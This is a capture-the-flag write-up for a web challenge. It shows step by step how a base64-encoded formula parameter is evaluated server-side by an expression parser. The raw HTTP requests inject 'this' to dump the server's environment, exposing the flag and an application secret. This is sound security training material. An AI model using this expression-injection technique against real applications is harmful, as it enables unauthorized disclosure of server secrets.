# Securinets Prequals CTF 2019 – Trading values

* **Category:** Web  
* **Points:** 989

## Challenge

> N00B developers are an easy target. Try to exploit the application feature
> to get the hidden flag.  
>  
> https://web1.ctfsecurinets.com/  
>  
> Author:TheEmperors

## Solution

The webiste plots some values on a graph. Here the JavaScript of the widget.

```javascript  
<script>

Highcharts.chart('container', {  
   chart: {  
       type: 'spline',  
       animation: Highcharts.svg, // don't animate in old IE  
       marginRight: 10,  
       events: {  
           load: function () {

               // set up the updating of the chart each second  
               var series = this.series[0];  
               var formula="KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=";  
               setInterval(function () {  
                 $.get( "/default", { "formula": formula, "values":{"v1": "STC","v2":"PLA","v3":"SDF","v4":"OCK"} }   )  
                 .done(function( data ) {  
                   var x = (new Date()).getTime(), // current time  
                       y = parseInt(data);  
                   if(y<1000)formula="KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=";  
                   else if(y>1000 && y<10000)formula="KHYxLm1way12MS5kcmYqKHYxLm1way8xMDApLXYxLmRyZikvKHYxLmF2ZyowLjMpLSh2Mi5hdmcvKCg0LzMpKnYyLm1kcyt2Mi5kbXEqMTAwKSkrKHYzLnBkaSt2My5wZGkrMy8yKig1KnYzLnJhciktNjkqdjMuZ2RwKSsxLjcqKHY0Lm11bSp2NC5kYWQpKjE2LjUqdjQuYXZn";  
                   else if(y>10000 && y<100000)formula="KHYxLm1way12MS5kcmYqKHYxLm1way8wLjEpLXYxLmRyZikvKHYxLmF2ZyowLjgpLSh2Mi5hdmcvKCgxLzIpKnYyLm1kcy0yNC92Mi5kbXEqMTApKSsodjMucGRpLXYzLnBkaSszLzIqKDIvNSp2My5yYXIpLTY2KnYzLmdkcCkqNy41Lyh2NC5tdW0vdjQuZGFkKSo2LjUvdjQuYXZn";  
                   else formula="KHYxLm1way12MS5kcmYqKHYxLm1way8wLjA2KS12MS5kcmYpLyh2MS5hdmcqMC4yNSkrKHYyLmF2Zy8oKDMvMikvdjIubWRzLTg0L3YyLmRtcSoxOSkpLSh2My5wZGktdjMucGRpKzkvMiooMTIvNyp2My5yYXIpLTY2KnYzLmdkcCkqMC41Lyh2NC5tdW0qKnY0LmRhZCkqMC4zOS92NC5hdmcqKjI=";  
                   series.addPoint([x, y], true, true);  
                 });  
               }, 1000);  
           }  
       }  
   },

   time: {  
       useUTC: false  
   },

   title: {  
       text: 'Live Securinets Trading values'  
   },  
   xAxis: {  
       type: 'datetime',  
       tickPixelInterval: 300  
   },  
   yAxis: {  
       title: {  
           text: 'Value'  
       },  
       plotLines: [{  
           value: 0,  
           width: 1,  
           color: '#808080'  
       }]  
   },  
   tooltip: {  
       headerFormat: '**{series.name}**  
',  
       pointFormat: '{point.x:%Y-%m-%d %H:%M:%S}  
{point.y:.2f}'  
   },  
   legend: {  
       enabled: false  
   },  
   exporting: {  
       enabled: false  
   },  
   series: [{  
       name: 'Random data',  
       data: (function () {  
           // generate an array of random data  
           var data = [],  
               time = (new Date()).getTime(),  
               i;

           for (i = -19; i <= 0; i += 1) {  
               data.push({  
                   x: time + i * 1000,  
                   y: Math.random()  
               });  
           }  
           return data;  
       }())  
   }]  
});  
</script>  
```

The base64 decoded formulas are the following.

```  
(v1.mpk+v1.drf*(v1.mpk/0.5)-v1.drf)/(v1.avg*0.1)+(v2.avg*(v2.mds+v2.dmq))-(v3.pdi+v3.pdi+3/2*(v3.rar)-v3.gdp)+0.25*(v4.mum*v4.dad)*v4.avg

(v1.mpk+v1.drf*(v1.mpk/0.5)-v1.drf)/(v1.avg*0.1)+(v2.avg*(v2.mds+v2.dmq))-(v3.pdi+v3.pdi+3/2*(v3.rar)-v3.gdp)+0.25*(v4.mum*v4.dad)*v4.avg

(v1.mpk-v1.drf*(v1.mpk/100)-v1.drf)/(v1.avg*0.3)-(v2.avg/((4/3)*v2.mds+v2.dmq*100))+(v3.pdi+v3.pdi+3/2*(5*v3.rar)-69*v3.gdp)+1.7*(v4.mum*v4.dad)*16.5*v4.avg

(v1.mpk-v1.drf*(v1.mpk/0.1)-v1.drf)/(v1.avg*0.8)-(v2.avg/((1/2)*v2.mds-24/v2.dmq*10))+(v3.pdi-v3.pdi+3/2*(2/5*v3.rar)-66*v3.gdp)*7.5/(v4.mum/v4.dad)*6.5/v4.avg

(v1.mpk-v1.drf*(v1.mpk/0.06)-v1.drf)/(v1.avg*0.25)+(v2.avg/((3/2)/v2.mds-84/v2.dmq*19))-(v3.pdi-v3.pdi+9/2*(12/7*v3.rar)-66*v3.gdp)*0.5/(v4.mum**v4.dad)*0.39/v4.avg**2  
```

The sent request is a HTTP GET with a base64 encoded formula and a series of
values to execute on the server.

```  
https://web1.ctfsecurinets.com/default?formula=KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc%3D&values%5Bv1%5D=STC&values%5Bv2%5D=PLA&values%5Bv3%5D=SDF&values%5Bv4%5D=OCK  
```

URL-decoded values are the following.

```  
values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK  
```

The complete request-response process is like the following.

```  
GET
/default?formula=KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc%3D&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK
HTTP/1.1  
Host: web1.ctfsecurinets.com  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
Firefox/65.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK  
Server: nginx/1.10.3 (Ubuntu)  
Date: Sun, 24 Mar 2019 09:21:11 GMT  
Content-Type: text/html; charset=UTF-8  
Connection: close  
Cache-Control: private, must-revalidate  
pragma: no-cache  
expires: -1  
Content-Length: 15

1023517.4691689  
```

Encoding a custom operation like `1+1` in base64 (`DQoxKzE=`) and sending as
formula, will produce a result.

```  
GET
/default?formula=DQoxKzE=&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK
HTTP/1.1  
Host: web1.ctfsecurinets.com  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
Firefox/65.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK  
Server: nginx/1.10.3 (Ubuntu)  
Date: Sun, 24 Mar 2019 09:22:11 GMT  
Content-Type: text/html; charset=UTF-8  
Connection: close  
Cache-Control: private, must-revalidate  
pragma: no-cache  
expires: -1  
Content-Length: 1

2  
```

Passing a random string, like `aaa` in base64 (`YWFh`), will give an
interesting error.

```  
GET
/default?formula=YWFh&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK
HTTP/1.1  
Host: web1.ctfsecurinets.com  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
Firefox/65.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK  
Server: nginx/1.10.3 (Ubuntu)  
Date: Sun, 24 Mar 2019 09:26:57 GMT  
Content-Type: text/html; charset=UTF-8  
Connection: close  
Cache-Control: private, must-revalidate  
pragma: no-cache  
expires: -1  
Content-Length: 67

Variable "aaa" is not valid around position 1 for expression `aaa`.  
```

Hence the formula is executed server side with an expression parser (i.e.
https://github.com/symfony/expression-language).

Passing directly the name of the variable, will print all the object, e.g.
passing `v1` (`djE=`) will give the following.

```  
GET
/default?formula=djE=&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK
HTTP/1.1  
Host: web1.ctfsecurinets.com  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
Firefox/65.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1

HTTP/1.1 500 Internal Server Error  
Server: nginx/1.10.3 (Ubuntu)  
Date: Sun, 24 Mar 2019 09:42:57 GMT  
Content-Type: text/html; charset=UTF-8  
Connection: close  
Content-Length: 144

object(App\Entity\STC)#233 (4) {  
 ["id":"App\Entity\STC":private]=>  
 NULL  
 ["avg"]=>  
 int(972)  
 ["mpk"]=>  
 int(3)  
 ["drf"]=>  
 int(99)  
}  
```

So, values are objects of classes defined in a classpath. Adding a new value
`v0`, setting it to `this` and trying to print it, will give you tons of
information.

```  
GET
/default?formula=djA=&values[v0]=this&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK
HTTP/1.1  
Host: web1.ctfsecurinets.com  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
Firefox/65.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1  
```

Inside the output, you will find the flag into an environment variable.

```  
                                   object(Symfony\Component\HttpFoundation\ServerBag)#10 (1) {  
                                     ["parameters":protected]=>  
                                     array(42) {  
                                       ["USER"]=>  
                                       string(8) "www-data"  
                                       ["HOME"]=>  
                                       string(8) "/var/www"  
                                       ["HTTP_UPGRADE_INSECURE_REQUESTS"]=>  
                                       string(1) "1"  
                                       ["HTTP_ACCEPT_ENCODING"]=>  
                                       string(13) "gzip, deflate"  
                                       ["HTTP_ACCEPT_LANGUAGE"]=>  
                                       string(35) "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3"  
                                       ["HTTP_ACCEPT"]=>  
                                       string(74) "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"  
                                       ["HTTP_USER_AGENT"]=>  
                                       string(78) "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"  
                                       ["HTTP_CONNECTION"]=>  
                                       string(5) "close"  
                                       ["HTTP_HOST"]=>  
                                       string(14) "127.0.0.1:8081"  
                                       ["HTTP_X_FORWARDED_FOR"]=>  
                                       string(12) "x.x.x.x"  
                                       ["HTTP_X_FORWARDED_PROTO"]=>  
                                       string(5) "https"  
                                       ["HTTP_X_FORWARDED_HOST"]=>  
                                       string(22) "web1.ctfsecurinets.com"  
                                       ["HTTP_TRUSTED_PROXIES"]=>  
                                       string(13) "172.17.0.0/16"  
                                       ["SCRIPT_FILENAME"]=>  
                                       string(51) "/var/www/html/epreuve/symfony_task/public/index.php"  
                                       ["REDIRECT_STATUS"]=>  
                                       string(3) "200"  
                                       ["SERVER_NAME"]=>  
                                       string(1) "_"  
                                       ["SERVER_PORT"]=>  
                                       string(2) "80"  
                                       ["SERVER_ADDR"]=>  
                                       string(10) "172.17.0.3"  
                                       ["REMOTE_PORT"]=>  
                                       string(5) "57272"  
                                       ["REMOTE_ADDR"]=>  
                                       string(10) "172.17.0.1"  
                                       ["SERVER_SOFTWARE"]=>  
                                       string(12) "nginx/1.10.3"  
                                       ["GATEWAY_INTERFACE"]=>  
                                       string(7) "CGI/1.1"  
                                       ["REQUEST_SCHEME"]=>  
                                       string(4) "http"  
                                       ["SERVER_PROTOCOL"]=>  
                                       string(8) "HTTP/1.0"  
                                       ["DOCUMENT_ROOT"]=>  
                                       string(41) "/var/www/html/epreuve/symfony_task/public"  
                                       ["DOCUMENT_URI"]=>  
                                       string(10) "/index.php"  
                                       ["REQUEST_URI"]=>  
                                       string(97) "/default?formula=djA=&values[v0]=this&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK"  
                                       ["SCRIPT_NAME"]=>  
                                       string(10) "/index.php"  
                                       ["CONTENT_LENGTH"]=>  
                                       string(0) ""  
                                       ["CONTENT_TYPE"]=>  
                                       string(0) ""  
                                       ["REQUEST_METHOD"]=>  
                                       string(3) "GET"  
                                       ["QUERY_STRING"]=>  
                                       string(88) "formula=djA=&values[v0]=this&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK"  
                                       ["FCGI_ROLE"]=>  
                                       string(9) "RESPONDER"  
                                       ["PHP_SELF"]=>  
                                       string(10) "/index.php"  
                                       ["REQUEST_TIME_FLOAT"]=>  
                                       float(1553422185.0433)  
                                       ["REQUEST_TIME"]=>  
                                       int(1553422185)  
                                       ["APP_ENV"]=>  
                                       string(4) "prod"  
                                       ["APP_SECRET"]=>  
                                       string(32) "44705a2f4fc85d70df5403ac8c7649fd"  
                                       ["FLAG"]=>  
                                       string(47) "Securinets{T00_Ea5y_T0_U5e_This_Local_variable}"  
                                       ["MAILER_URL"]=>  
                                       string(16) "null://localhost"  
                                       ["SYMFONY_DOTENV_VARS"]=>  
                                       string(34) "APP_ENV,APP_SECRET,FLAG,MAILER_URL"  
                                       ["APP_DEBUG"]=>  
                                       string(1) "0"  
                                     }  
                                   }  
```

The flag is the following.

```  
Securinets{T00_Ea5y_T0_U5e_This_Local_variable}  
```

Original writeup (https://github.com/m3ssap0/CTF-
Writeups/blob/master/Securinets%20Prequals%20CTF%202019/Trading%20values/README.md).